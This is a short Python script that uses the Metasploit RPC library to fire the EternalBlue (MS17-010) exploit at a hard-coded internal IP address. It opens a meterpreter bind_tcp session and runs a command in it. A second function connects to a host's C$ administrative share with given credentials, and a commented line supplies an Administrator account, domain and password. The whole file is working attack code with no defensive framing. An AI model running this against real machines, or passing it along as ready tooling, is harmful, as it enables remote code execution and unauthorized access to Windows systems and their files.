import subprocess
import smbclient
from pymetasploit3.msfrpc import MsfRpcClient

def smb_account_poc(username,password,domain,ipaddress):
    
    try:
        smb = smbclient.SambaClient(server=ipaddress, share="C$", username=username, password=password, domain=domain)
        exploit_folder = smb.listdir('/')
        return exploit_folder
    except:
        exploit_folder = "NULL"
        return exploit_folder
def ms17010_poc():
    client = MsfRpcClient('1qaz@WSX', ssl=False)
    exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
    exploit['RHOSTS']  = "10.10.91.87"
    job_id = exploit.execute(payload='windows/x64/meterpreter/bind_tcp')['job_id']
    #{'job_id': 1, 'uuid': '3whbuevf'
    if bool(client.sessions.list):
        shell = client.sessions.session('1')
        shell.write('dir')
        result = shell.read()
        result.split(' ')
        print(result[:240:])


ms17010_poc()
# account_poc_information = smb_account_poc('Administrator','1qaz@WSX','alex-ad.local',"192.168.89.214")
# print(account_poc_information)


from pymetasploit3.msfrpc import MsfRpcClient
client = MsfRpcClient('1qaz@WSX', ssl=False)
exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')